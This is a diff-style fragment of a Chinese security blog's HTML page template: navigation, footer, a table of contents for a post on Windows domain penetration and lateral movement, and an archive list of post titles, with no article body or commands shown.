+                    <div class="nextTitle">dompdf 0day(RCE)复现</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" title="Windows权限维持学习">
+                    <div class="prevTitle">Windows权限维持学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+     
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2992721672@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Ghostasky" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">1.</span> <span class="toc-text">1.名词解释</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">1.1.</span> <span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">1.2.</span> <span class="toc-text">域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%9F%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">单域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B6%E5%9F%9F%E5%92%8C%E5%AD%90%E5%9F%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">父域和子域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%A0%91"><span class="toc-number">1.2.3.</span> <span class="toc-text">域树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%A3%AE%E6%9E%97"><span class="toc-number">1.2.4.</span> <span class="toc-text">域森林</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">DNS域名服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%EF%BC%88AD%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">活动目录（AD）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AD%E4%B8%8EDC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.7.</span> <span class="toc-text">AD与DC的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E5%88%92%E5%88%86"><span class="toc-number">1.2.8.</span> <span class="toc-text">安全域划分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DMZ%E5%8C%BA%E5%9F%9F"><span class="toc-number">1.3.</span> <span class="toc-text">DMZ区域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text">域内权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%9F%E6%9C%AC%E5%9C%B0%E7%BB%84"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.域本地组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E7%BB%84"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.全局组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%80%9A%E7%94%A8%E7%BB%84"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.通用组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-A-G-DL-P%E7%AD%96%E7%95%A5"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.A-G-DL-P策略</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%9F%9F%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">2.域搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-amp-%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">3.端口转发&amp;边界代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg-Proxychains"><span class="toc-number">3.1.</span> <span class="toc-text">reGeorg+Proxychains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Earthworm-Proxychains"><span class="toc-number">3.2.</span> <span class="toc-text">Earthworm+Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9socks5%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">3.2.1.</span> <span class="toc-text">反弹socks5服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%EF%BC%88%E6%9C%89%E5%85%AC%E7%BD%91IP%EF%BC%89"><span class="toc-number">3.2.2.</span> <span class="toc-text">二级网络环境（有公网IP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%EF%BC%88%E6%97%A0%E5%85%AC%E7%BD%91IP%EF%BC%89"><span class="toc-number">3.2.3.</span> <span class="toc-text">二级网络（无公网IP）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.</span> <span class="toc-text">SSH隧道代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.1.</span> <span class="toc-text">ssh本地转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.2.</span> <span class="toc-text">ssh远程转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.3.</span> <span class="toc-text">动态端口转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.4.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E4%BB%A3%E7%90%86"><span class="toc-number">3.5.</span> <span class="toc-text">socket代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96shell"><span class="toc-number">4.</span> <span class="toc-text">4.获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84"><span class="toc-number">4.1.</span> <span class="toc-text">常规</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.2.</span> <span class="toc-text">ICMP隧道反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">5.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%BD%91%E5%8D%A1%E5%92%8CIP%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">5.1.1.</span> <span class="toc-text">查看当前网卡和IP信息：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.2.</span> <span class="toc-text">查看操作系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E9%99%86%E5%9F%9F%E5%8F%8A%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">5.1.3.</span> <span class="toc-text">查看当前登陆域及域用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E6%97%B6%E9%97%B4"><span class="toc-number">5.1.4.</span> <span class="toc-text">查看域内时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">5.1.5.</span> <span class="toc-text">查找域内所有计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%BB%84%E5%88%97%E8%A1%A8-%E9%BB%98%E8%AE%A413%E4%B8%AA"><span class="toc-number">5.1.6.</span> <span class="toc-text">查询域内所有用户组列表(默认13个)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E5%9F%9F%E6%88%90%E5%91%98%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.7.</span> <span class="toc-text">查询所有域成员计算机列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">5.1.8.</span> <span class="toc-text">查找域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">5.1.9.</span> <span class="toc-text">查看域控制器的主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">5.1.10.</span> <span class="toc-text">查看域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.11.</span> <span class="toc-text">查询域管理员列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.12.</span> <span class="toc-text">获取所有域用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nltest%E6%9F%A5%E8%AF%A2%E4%BF%A1%E4%BB%BB%E5%9F%9F"><span class="toc-number">5.1.13.</span> <span class="toc-text">nltest查询信任域</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86"><span class="toc-number">5.2.</span> <span class="toc-text">端口收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Windows%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text">6.Windows认证协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-NTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">6.1.</span> <span class="toc-text">1.NTLM认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LM-hash"><span class="toc-number">6.1.1.</span> <span class="toc-text">LM hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-hash"><span class="toc-number">6.1.2.</span> <span class="toc-text">NTLM hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">本地认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="toc-number">6.1.2.2.</span> <span class="toc-text">网络认证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-kerberos%E8%AE%A4%E8%AF%81"><span class="toc-number">6.2.</span> <span class="toc-text">2.kerberos认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">6.2.1.</span> <span class="toc-text">认证流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PAC-%E7%89%B9%E6%9D%83%E5%B1%9E%E6%80%A7%E8%AF%81%E4%B9%A6"><span class="toc-number">6.3.</span> <span class="toc-text">3.PAC(特权属性证书)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">7.横向移动总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%91%BD%E4%BB%A4"><span class="toc-number">7.1.</span> <span class="toc-text">Windows远程连接命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC%E8%BF%9E%E6%8E%A5"><span class="toc-number">7.1.1.</span> <span class="toc-text">IPC连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#at%E5%91%BD%E4%BB%A4"><span class="toc-number">7.1.2.</span> <span class="toc-text">at命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#schtash%E5%91%BD%E4%BB%A4"><span class="toc-number">7.1.3.</span> <span class="toc-text">schtash命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PsExec"><span class="toc-number">7.2.</span> <span class="toc-text">使用PsExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%8Cpass-the-hash"><span class="toc-number">7.3.</span> <span class="toc-text">PTH(Hash传递攻击，pass the hash)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">7.3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-number">7.3.2.</span> <span class="toc-text">使用mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec"><span class="toc-number">7.3.3.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec"><span class="toc-number">7.3.4.</span> <span class="toc-text">wmiexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec"><span class="toc-number">7.3.5.</span> <span class="toc-text">smbexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI"><span class="toc-number">7.3.6.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">7.3.6.1.</span> <span class="toc-text">查询进程信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">7.3.6.2.</span> <span class="toc-text">远程创建进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec-1"><span class="toc-number">7.3.6.3.</span> <span class="toc-text">wmiexec</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT-Pass-the-ticket"><span class="toc-number">7.4.</span> <span class="toc-text">PTT(Pass the ticket)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.4.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.4.2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB"><span class="toc-number">7.4.3.</span> <span class="toc-text">关于黄金票据和白银票据的一些区别:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%B8%8D%E5%90%8C"><span class="toc-number">7.4.3.1.</span> <span class="toc-text">1.访问权限不同</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C"><span class="toc-number">7.4.3.2.</span> <span class="toc-text">2.加密方式不同</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E4%B8%8D%E5%90%8C"><span class="toc-number">7.4.3.3.</span> <span class="toc-text">3.认证流程不同</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">7.4.4.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.4.5.</span> <span class="toc-text">域外用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">7.4.5.1.</span> <span class="toc-text">攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kerbrute-windows-amd64-exe"><span class="toc-number">7.4.5.1.1.</span> <span class="toc-text">kerbrute_windows_amd64.exe</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PY%E7%89%88%E6%9C%AC-pyKerbrute"><span class="toc-number">7.4.5.2.</span> <span class="toc-text">PY版本 pyKerbrute</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPN-%E6%89%AB%E6%8F%8F"><span class="toc-number">7.5.</span> <span class="toc-text">SPN 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN%E6%A0%BC%E5%BC%8F"><span class="toc-number">7.5.1.</span> <span class="toc-text">SPN格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN-%E6%9F%A5%E8%AF%A2"><span class="toc-number">7.5.2.</span> <span class="toc-text">SPN 查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">7.6.</span> <span class="toc-text">域委派</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 52
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2099 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2099/12/31/TOP/">胡言乱语&自言自语</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/">dompdf 0day(RCE)复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">内网渗透&横向移动&····</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/">Windows权限维持学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span>
+            <a class="archive-post-title" href="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Nodejs原型链污染</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/19</span>
+            <a class="archive-post-title" href="/2022/02/19/VulnHub03/">VulnHub_03_LAMPSECURITY: CTF7</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span>
+            <a class="archive-post-title" href="/2022/02/17/VulnHub02/">VulnHub_02_LAMPSECURITY: CTF5</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2022/02/16/VulnHub01/">VulnHub_01_LAMPSECURITY: CTF4</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span>
+            <a class="archive-post-title" href="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/">内网渗透-隧道隐藏</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2022/02/05/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">2021年终总结</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span>
+            <a class="archive-post-title" href="/2021/12/08/BUU-PWN-0x50-0x5F/">BUU_PWN刷题_0x50-0x5F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span>
+            <a class="archive-post-title" href="/2021/12/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理Note</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
+            <a class="archive-post-title" href="/2021/11/27/6.s081/">MIT6.S081+XV6 Note</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span>
+            <a class="archive-post-title" href="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/">陇原战疫杯2021部分WP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span>
+            <a class="archive-post-title" href="/2021/11/07/BUU-RE-0x01-0x1F/">BUU_RE刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span>
+            <a class="archive-post-title" href="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/">再战PE结构</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span>
+            <a class="archive-post-title" href="/2021/10/17/BUU-PWN-0x40-0x4F/">BUU_PWN刷题_0x40-0x4F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span>
+            <a class="archive-post-title" href="/2021/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/">PHP反序列化整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span>
+            <a class="archive-post-title" href="/2021/09/24/IO_FILE/">IO_FILE调试+详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span>
